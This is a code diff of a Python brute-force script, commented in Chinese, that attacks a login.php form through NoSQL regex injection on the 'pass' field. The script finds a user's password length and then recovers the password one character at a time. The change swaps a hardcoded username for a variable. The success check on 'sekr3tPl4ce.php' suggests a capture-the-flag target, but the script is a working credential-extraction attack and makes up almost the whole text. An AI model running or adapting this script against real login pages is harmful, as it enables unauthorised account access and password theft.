@@ -6,7 +6,7 @@ head={
         "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
     }
 url = "http://XXXXX/login.php"  #爆破URL
-
+name  ='爆破的用户名'
 def check_if_success(response): #判断请求是否成功的函数
     if "Location" in response.headers:  #可根据需求更改
         return "sekr3tPl4ce.php" in response.headers["Location"]
@@ -17,7 +17,7 @@ file1 = open("/root/Desktop/numberonly.txt","r").read().split("\n")
 for num in file1:
         #time.sleep(1)延迟可以防止被服务器封锁
         data = {
-            "user" : "john",
+            "user" : name,
             "pass[$regex]" : "^.{"+num+"}$", #爆破payload可以据需求更改
             "remmember" : "on"
         }
@@ -37,7 +37,7 @@ while j < password_size:
                 #time.sleep(1)
                 passwordchar[j] = i
                 data = {
-                    "user" : "john",
+                    "user" : name,
                     "pass[$regex]" : "^"+''.join(passwordchar[0:password_size])+"$",#爆破payload可以据需求更改
                     "remmember" : "on"
                 }
